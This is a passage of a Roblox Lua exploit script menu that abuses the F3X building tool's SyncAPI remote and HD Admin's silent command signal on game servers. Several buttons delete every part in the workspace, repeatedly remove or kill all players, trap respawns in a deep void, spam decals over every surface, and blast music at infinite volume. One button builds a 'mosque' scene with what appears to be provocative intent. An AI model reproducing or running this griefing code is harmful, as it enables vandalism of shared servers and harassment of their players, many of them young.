        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrpcf = player.Character.HumanoidRootPart.CFrame
            local x = hrpcf.x
            local z = hrpcf.z
            local randint = math.random(-600, 600)
            local randint2 = math.random(-600, 600)
            local xloc = randint + x
            local zloc = randint2 + z
            local cf = player.Character.HumanoidRootPart.CFrame.y + 800  

            spawn(function()
                local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)), workspace)
                for i, v in game.Workspace:GetDescendants() do
                    if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
                        SetName(v, "MiniToad")
                        SetAnchor(false, v)
                        AddMesh(v)
                        
                        SetMesh(v, "7234998844")
                        SetTexture(v, "1009824086")
                        SetCollision(v, false)
                        v.Orientation = Vector3.new(0, 0, 0)

                        local sound = Instance.new("Sound", v)
                        sound.SoundId = "rbxassetid://153752123"
                        sound.Volume = 10
                        sound.PlayOnRemove = true
                        sound:Destroy()
                    end
                end
            end)
        else
            wait(1)
        end
    end
end

coroutine.wrap(createRainToads)()

Sky("201208408")

local player = game.Players.LocalPlayer
local char = player.Character
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

function Punish(player)
    local char = player.Character
    DestroyPart(char)
end

coroutine.wrap(function()
    while true do
        for i, v in game.Players:GetPlayers() do
            pcall(function()
                Punish(v)
            end)
        end
        task.wait(0.0)
    end
end)()

-- Set time and fog color
SilentRequest:InvokeServer(";time 0")
SilentRequest:InvokeServer(";fogcolor black")
    end
})
AddButton({
    Name = "Gravity Hammer by ?",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local hum = char.Humanoid
	local hed = char.Head
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end


	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function CreateFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}
		spawn(function()
			_(args)
		end)
		local args2 = {
			[1] = "SyncDecorate",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire",
					["Size"] = 3.5,
					["Heat"] = 25,
					["Color"]=Color3.fromRGB(255, 115, 0),
					["SecondaryColor"]=Color3.fromRGB(255, 75, 10),
				}
			}
		}
		spawn(function()
			_(args2)
		end)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end
	function reflect(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Reflectance"] = int
				}
			}
		}
		_(args)
	end
	function SetMesh(part,meshid,offset)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid,
					["Offset"] = offset
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function breakWelds(part)
		local welds = {}
		for _, weld in ipairs(part:GetDescendants()) do
			if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
				table.insert(welds, weld)
			end
		end

		if #welds == 0 then
			return false
		end

		local args = {
			"RemoveWelds",
			welds
		}
		_(args)
		return true
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreatePointlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "PointLight"
				}
			}
		}
		_(args)
	end
	function CreateLight(part)
		local args = {
			"CreateLights",
			{
				{
					["Part"] = part,
					["LightType"] = "PointLight"
				}
			}
		}
		spawn(function()
			_(args)
		end)
		local args2 = {
			"SyncLighting",
			{
				{
					["Part"] = part,
					["LightType"] = "PointLight",
					["Color"] = Color3.fromRGB(255,125,0),
					["Range"] = 18,
					["Brightness"] = 5,
				}
			}
		}
		spawn(function()
			_(args2)
		end)
	end
	function playSFX(id,parent)
		local SFX = Instance.new('Sound',parent)
		SFX.Volume = 1
		SFX.SoundId = "rbxassetid://" ..id
		SFX:Play()
		return SFX
	end
	function SyncLighting(part,brightness,color,range)
		local args2 = {
			"SyncLighting",
			{
				{
					["Part"] = part,
					["LightType"] = "PointLight",
					["Color"] = color,
					["Range"] = range,
					["Brightness"] = brightness,
				}
			}
		}
		_(args2)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end
	local Animations = {"rbxassetid://74897796","rbxassetid://74813494","rbxassetid://54432537"}
	local sound = "rbxassetid://1255794"

	local Hammer = remote:InvokeServer("CreatePart","Normal",CFrame.new(0,0,0),char)
	local FireEffect = remote:InvokeServer("CreatePart","Normal",CFrame.new(0,0,0),char)
	spawn(function()
		AddMesh(Hammer)
	end)
	spawn(function()
		SetMesh(Hammer,"1256290", Vector3.new(0, 0, 0))
	end)
	spawn(function()
		SetTexture(Hammer,"1256283")
	end)
	spawn(function()
		SetName(Hammer,"Gravity Hammer")
	end)
	spawn(function()
		SetCollision(Hammer,false)
	end)
	spawn(function()
		CreatePointlight(Hammer)
	end)
	spawn(function()
		MeshResize(Hammer, Vector3.new(0.05,0.05,0.05))
	end)
	spawn(function()
		Resize(Hammer, Vector3.new(2.6,0.5,9.7),Hammer.CFrame)
	end)
	spawn(function()
		MovePart(Hammer, char["Right Arm"].CFrame *CFrame.new(0,-0.6,-3) * CFrame.Angles(math.rad(180),0,math.rad(-90)))
	end)
	spawn(function()
		Weld(Hammer,char["Right Arm"],Hammer)
	end)
	spawn(function()
		SetAnchor(false,Hammer)
	end)
	spawn(function()
		SetTrans(Hammer,1)
	end)

	spawn(function()
		MovePart(FireEffect, char["Right Arm"].CFrame *CFrame.new(0,-0.6,1.5) * CFrame.Angles(math.rad(270),0,0))
	end)
	spawn(function()
		Weld(FireEffect,Hammer,FireEffect)
	end)
	spawn(function()
		SetAnchor(false,FireEffect)
	end)
	spawn(function()
		--CreateFire(FireEffect)
	end)
	spawn(function()
		SetTrans(FireEffect,1)
	end)
	spawn(function()
		SetCollision(FireEffect,false)
	end)




	local GravityHammer = Instance.new('Tool',player.Backpack)
	GravityHammer.Name = "Gravity Hammer"
	GravityHammer.RequiresHandle = false
	GravityHammer.TextureId = "rbxassetid://13643093001"
	hold=Instance.new('Animation')
	hold.AnimationId='rbxassetid://182393478'
	hoId=char.Humanoid:LoadAnimation(hold)
	hoId.Looped=true

	local SFX = Instance.new('Sound',Hammer)
	SFX.Volume = 1
	SFX.SoundId = sound


	GravityHammer.Activated:connect(function()
		AnimationId = Animations[math.random(1,#Animations)]
		local anim = Instance.new("Animation")
		anim.AnimationId = AnimationId
		local Anima = char.Humanoid:LoadAnimation(anim)
		Anima:Play()
		Anima:AdjustSpeed(2)
		SFX:Play()

		local connect
		connect = Hammer.Touched:connect(function(hit)
			if hit:IsA("BasePart") then
				local hitChar = hit.Parent  
				if not hitChar then return end

				if hitChar == char then return end
				spawn(function()
					pcall(function()
						SetAnchor(false, hit)
					end)

					wait(0.3)
					if connect then 
						connect:Disconnect()
					end
				end)

				local otherPlayer = game.Players:GetPlayerFromCharacter(hitChar)
				if otherPlayer and otherPlayer ~= game.Players.LocalPlayer then
					if hitPlayer.Character and hitPlayer.Character:FindFirstChild("Humanoid") then
						spawn(function()
							Resize(hitPlayer.Character.Head, hitPlayer.Character.Head.Size, hitPlayer.Character.Head.CFrame)
						end)
					end
				end
			end
		end)
	end)

	GravityHammer.Equipped:Connect(function()
		spawn(function()
			spawn(function()
				SetTrans(Hammer,0)
			end)
			hoId:Play()
			spawn(function()
				CreateFire(FireEffect)
			end)
			spawn(function()
				SyncLighting(Hammer,5,Color3.fromRGB(255,125,0),18)
			end)
		end)
	end)

	GravityHammer.Unequipped:Connect(function()
		spawn(function()
			spawn(function()
				SetTrans(Hammer,1)
			end)
			hoId:Stop()
			for i,v in FireEffect:GetDescendants() do
				if v:IsA("Fire") then
					spawn(function()
						DestroyPart(v)
					end)
				end
			end
			spawn(function()
				SyncLighting(Hammer,0,Color3.fromRGB(0,0,0),0)
			end)
		end)
	end)
    end
})
AddButton({
    Name = "Rainbow Floating pad",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
		break
	end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
		break
	end
end
if not tool then return end
local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end
function CreatePart(cf, parent, types)
	local args = {[1]="CreatePart",[2]=types or "Normal",[3]=cf,[4]=parent}
	_(args)
end
function Resize(part, size, cf)
	local args = {[1]="SyncResize",[2]={[1]={["Part"]=part,["CFrame"]=cf,["Size"]=size}}}
	_(args)
end
function MovePart(part, cf)
	local args = {[1]="SyncMove",[2]={[1]={["Part"]=part,["CFrame"]=cf}}}
	_(args)
end
function Color(part, color)
	local args = {[1]="SyncColor",[2]={[1]={["Part"]=part,["Color"]=color,["UnionColoring"]=false}}}
	_(args)
end
function SetMaterial(part, material)
	local args = {[1]="SyncMaterial",[2]={[1]={["Part"]=part,["Material"]=Enum.Material[material]}}}
	_(args)
end
function SetCollision(part, boolean)
	local args = {[1]="SyncCollision",[2]={[1]={["Part"]=part,["CanCollide"]=boolean}}}
	_(args)
end
function SetLocked(part, boolean)
	local args = {[1]="SetLocked",[2]={[1]=part},[3]=boolean}
	_(args)
end
local padPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
CreatePart(padPos, workspace, "Cylinder")
wait(0.1)
local floatingPad
for i,v in workspace:GetChildren() do
	if v:IsA("BasePart") and (v.CFrame.Position - padPos.Position).Magnitude < 5 and not v.Parent:FindFirstChild("Humanoid") then
		floatingPad = v
		Resize(floatingPad, Vector3.new(0.5, 6, 6), padPos * CFrame.Angles(0, 0, math.rad(90)))
		Color(floatingPad, Color3.fromRGB(128, 0, 128))
		SetMaterial(floatingPad, "Neon")
		SetCollision(floatingPad, true)
		SetLocked(floatingPad, true)
		break
	end
end
if floatingPad then
	local RunService = game:GetService("RunService")
	RunService.Heartbeat:Connect(function()  
		pcall(function()  
			if char and char:FindFirstChild("HumanoidRootPart") then  
				local targetPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)  
				MovePart(floatingPad, targetPos * CFrame.Angles(0, 0, math.rad(90)))  
			end  
		end)  
	end)  
	task.spawn(function()  
		while task.wait(0.6) do  
			pcall(function()  
				if floatingPad then  
					local randomColor = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))  
					Color(floatingPad, randomColor)
					task.wait(0.05)
					SetMaterial(floatingPad, "Neon")
				end  
			end)  
		end  
	end)
end
    end
})
AddButton({
    Name = "Loop Respawn All",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

SilentRequest:InvokeServer(";btools me")
wait(0.5)

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then return end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function delete(part)
	local args = { "Remove", { part } }
	serverendpoint:InvokeServer(unpack(args))
end

local function deleteall()
	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
			spawn(function() delete(v) end)
		end
	end
end

local function createVoidSpawn(cframe)
	local spawnPart = serverendpoint:InvokeServer("CreatePart", "Spawn", cframe, workspace)
	serverendpoint:InvokeServer("SyncResize", {
		{ Part = spawnPart, CFrame = cframe, Size = Vector3.new(5, 0.1, 5) }
	})
	serverendpoint:InvokeServer("SyncCollision", {
		{ Part = spawnPart, CanCollide = false }
	})
	serverendpoint:InvokeServer("SyncMaterial", {
		{ Part = spawnPart, Transparency = 1 }
	})
	serverendpoint:InvokeServer("SetLocked", {spawnPart}, true)
	serverendpoint:InvokeServer("SetName", {spawnPart}, "VOID_TRAP")
	return spawnPart
end

local function forceRespawnTrap(voidSpawn)
	for _, plr in ipairs(game.Players:GetPlayers()) do
		plr.CharacterAdded:Connect(function(char)
			char:MoveTo(voidSpawn.Position + Vector3.new(0,5,0))
		end)
	end
	game.Players.PlayerAdded:Connect(function(plr)
		plr.CharacterAdded:Connect(function(char)
			char:MoveTo(voidSpawn.Position + Vector3.new(0,5,0))
		end)
	end)
end

local function killAllNow()
	for _, plr in ipairs(game.Players:GetPlayers()) do
		if plr.Character and plr.Character:FindFirstChild("Humanoid") then
			plr.Character.Humanoid.Health = 0
		end
	end
end

deleteall()
wait(2)

local deepVoidY = -50000 
local voidSpawn = createVoidSpawn(CFrame.new(0, deepVoidY, 0))

forceRespawnTrap(voidSpawn)

wait(1)
SilentRequest:InvokeServer(";re all")
SilentRequest:InvokeServer(";kill all")
wait(1.7)
SilentRequest:InvokeServer(";music 137418375092271")
SilentRequest:InvokeServer(";pitch .11")
SilentRequest:InvokeServer(";volume inf")
    end
})
AddButton({
    Name = "Realm V3",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
end

local f3x = getf3x()
if not f3x then warn("No F3X found.") return end
local endpoint = f3x.SyncAPI.ServerEndpoint

local function fastInvoke(args)
    task.spawn(function()
        pcall(function() endpoint:InvokeServer(unpack(args)) end)
    end)
end

local function resize(part, size, cf) fastInvoke({"SyncResize", {{Part = part, CFrame = cf, Size = size}}}) end
local function material(part, mat) fastInvoke({"SyncMaterial", {{Part = part, Material = mat}}}) end
local function color(part, col) fastInvoke({"SyncColor", {{Part = part, Color = col, UnionColoring = false}}}) end
local function transparency(part, t) fastInvoke({"SyncMaterial", {{Part = part, Transparency = t}}}) end
local function mesh(part, id, texture, scale)
    fastInvoke({"CreateMeshes", {{Part = part}}})
    if id then fastInvoke({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. id}}}) end
    if texture then fastInvoke({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texture}}}) end
    if scale then fastInvoke({"SyncMesh", {{Part = part, Scale = scale}}}) end
end
local function setLock(part, locked) fastInvoke({"SetLocked", {part}, locked}) end
local function movePart(part, cf) fastInvoke({"SyncMove", {{Part = part, CFrame = cf}}}) end
local function createDecal(part, face)
    fastInvoke({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end
local function setDecal(part, face, textureId)
    fastInvoke({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://" .. textureId}}})
end
local function setCollision(part, canCollide) fastInvoke({"SyncCollision", {{Part = part, CanCollide = canCollide}}}) end

local function quickPart(type, cf, size, mat, col, trans, meshId, meshTex, meshScale, extra)
    task.spawn(function()
        local part = endpoint:InvokeServer("CreatePart", type, cf, workspace.Terrain)
        if part then
            resize(part, size, cf)
            if mat then material(part, mat) end
            if col then color(part, col) end
            if trans then transparency(part, trans) end
            if meshId or meshTex or meshScale then mesh(part, meshId, meshTex, meshScale) end
            if extra then extra(part) end
        end
        return part
    end)
end

for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        fastInvoke({"Remove", {v}})
    end
end
task.wait(1)

local function buildMosque()
    quickPart("Normal", CFrame.new(-23.874, 49, 11.852), Vector3.new(130, 1, 89), Enum.Material.Concrete)
    quickPart("Normal", CFrame.new(-23.874, 49, -32), Vector3.new(130, 1, 40), Enum.Material.Concrete)
    quickPart("Normal", CFrame.new(-23.874, 49, 56), Vector3.new(130, 1, 40), Enum.Material.Concrete)
    quickPart("Normal", CFrame.new(-24.599, 24.5, -32.58), Vector3.new(138, 49, 2), Enum.Material.Concrete, nil, nil, nil, nil, nil, setLock)
    quickPart("Normal", CFrame.new(-24.599, 24.5, 55.42), Vector3.new(138, 49, 2), Enum.Material.Concrete, nil, nil, nil, nil, nil, setLock)
    quickPart("Normal", CFrame.new(38.901, 24.5, 11.92), Vector3.new(1, 49, 91), Enum.Material.Concrete, nil, nil, nil, nil, nil, setLock)
    quickPart("Normal", CFrame.new(-89.099, 24.5, 11.92), Vector3.new(1, 49, 91), Enum.Material.Concrete, nil, nil, nil, nil, nil, setLock)
    quickPart("Normal", CFrame.new(-25, 0.5, 11), Vector3.new(130, 1, 91), Enum.Material.Concrete, Color3.fromRGB(200, 200, 200), nil, nil, nil, nil, setLock)
    quickPart("Spawn", CFrame.new(20.371, -0.1, 12.897), Vector3.new(1, 1, 1))
end

local function addWaterFountain()
    local centerPos = Vector3.new(-24, 1, 11)
    local baseCFrame = CFrame.new(centerPos.X, 1 + 0.5, centerPos.Z)
    local base = quickPart("Normal", baseCFrame, Vector3.new(25, 1, 25), Enum.Material.Marble, Color3.fromRGB(220, 220, 255), nil, nil, nil, nil, setLock)
    local poolCFrame = baseCFrame + Vector3.new(0, 0.5 + 0.4, 0)
    local pool = quickPart("Normal", poolCFrame, Vector3.new(22, 0.8, 22), Enum.Material.SmoothPlastic, Color3.fromRGB(80, 140, 255), 0.2, nil, nil, nil, setLock)
    local centerCFrame = baseCFrame + Vector3.new(0, 0.5 + 2.5, 0)
    local center = quickPart("Normal", centerCFrame, Vector3.new(6, 5, 6), Enum.Material.Marble, Color3.fromRGB(240, 240, 255), nil, nil, nil, nil, setLock)
    local waterCFrame = poolCFrame
    local water = quickPart("Normal", waterCFrame, Vector3.new(21, 0.3, 21), Enum.Material.Neon, Color3.fromRGB(0, 100, 255), 0.6, nil, nil, nil, setLock)
    local topCFrame = baseCFrame + Vector3.new(0, 0.5 + 5, 0)
    local top = quickPart("Normal", topCFrame, Vector3.new(4, 2, 4), Enum.Material.Neon, Color3.fromRGB(200, 220, 255), 0.1, nil, nil, nil, setLock)
    local ring1CFrame = baseCFrame + Vector3.new(0, 0.5 + 1.25, 0)
    local ring1 = quickPart("Normal", ring1CFrame, Vector3.new(8, 0.5, 8), Enum.Material.Neon, Color3.fromRGB(180, 200, 255), 0.3, nil, nil, nil, setLock)
    local ring2CFrame = baseCFrame + Vector3.new(0, 0.5 + 3.5, 0)
    local ring2 = quickPart("Normal", ring2CFrame, Vector3.new(5, 0.5, 5), Enum.Material.Neon, Color3.fromRGB(160, 180, 255), 0.2, nil, nil, nil, setLock)
end

local function addKrab()
    local tool
    for _, v in player:GetDescendants() do if v.Name == "SyncAPI" then tool = v.Parent end end
    for _, v in game.ReplicatedStorage:GetDescendants() do if v.Name == "SyncAPI" then tool = v.Parent end end
    local remote = tool.SyncAPI.ServerEndpoint
    local function _(args) remote:InvokeServer(unpack(args)) end

    local oldX, oldZ = -77.241, 8.652
    local riseAmount = 5
    local floorY = 9.9 + 1 + riseAmount
    local spawnCFrame = CFrame.new(oldX, floorY, oldZ) * CFrame.Angles(0, math.rad(-90) + math.pi, 0)
    local krab = quickPart("Normal", spawnCFrame, Vector3.new(1,1,1), nil, nil, nil, "127964724840879", "82674910742158", Vector3.new(0.2,0.2,0.2), setLock)
end

local function addRulesPoster()
    local posterId1 = "83022346908747"
    local posterId2 = "109515346551244"
    local posterHeight = 25
    local posterWidth = 40
    local posterThickness = 3.5

    local rightWallX = 38.901
    local rightPosterX = rightWallX - 0.5 - (posterThickness/2)
    local posterY = 24
    local posterZ = 11.92
    local rightCFrame = CFrame.new(rightPosterX, posterY, posterZ)
    local rightPoster = quickPart("Normal", rightCFrame, Vector3.new(posterThickness, posterHeight, posterWidth), nil, Color3.new(1,1,1), 0, nil, nil, nil, function(p)
        setCollision(p,false)
        createDecal(p, Enum.NormalId.Left)
        setDecal(p, Enum.NormalId.Left, posterId1)
        setLock(p,true)
    end)

    local backPosterZ = 55.42 - 0.5 - (posterThickness/2)
    local backPosterX = -24.599
    local backCFrame = CFrame.new(backPosterX, posterY, backPosterZ)
    local backPoster = quickPart("Normal", backCFrame, Vector3.new(posterWidth, posterHeight, posterThickness), nil, Color3.new(1,1,1), 0, nil, nil, nil, function(p)
        setCollision(p,false)
        createDecal(p, Enum.NormalId.Front)
        setDecal(p, Enum.NormalId.Front, posterId2)
        setLock(p,true)
    end)
end

buildMosque()
task.wait(1)
addWaterFountain()
task.wait(1)
addKrab()
task.wait(1)
addRulesPoster()
task.wait(2)

pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";music 117137820246363 ;pitch .1 ;volume inf")
end)

task.wait(1.5)

pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";res all")
end)
    end
})
AddButton({
    Name = "k00pkidd sky",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("11426185601")
end
})
AddButton({
    Name = "1x3x5x6",
    Callback = function()
        -- HD Admin Commands
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")

-- SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

-- SyncAPI Functions
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
    _({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
    _({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

local function SetVertexColor(part, color)
    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

-- Giant Sky Function (65000-70000 scale)
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4)) -- vertex color
            MeshResize(v, Vector3.new(109888, 109888, 109888)) -- massive scale
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end

-- Spam Function
local function Spam(id)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                    SpawnDecal(v, side)
                    AddDecal(v, id, side)
                end
            end)
        end
    end
end

-- Execute (Decal spam first, then skybox)
Spam("3342499434") -- spam decals first
GiantSky("128489302769617") -- giant skybox second

local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 94284750410104 ;pitch 0.2230 ;volume inf")

end
})

AddButton({
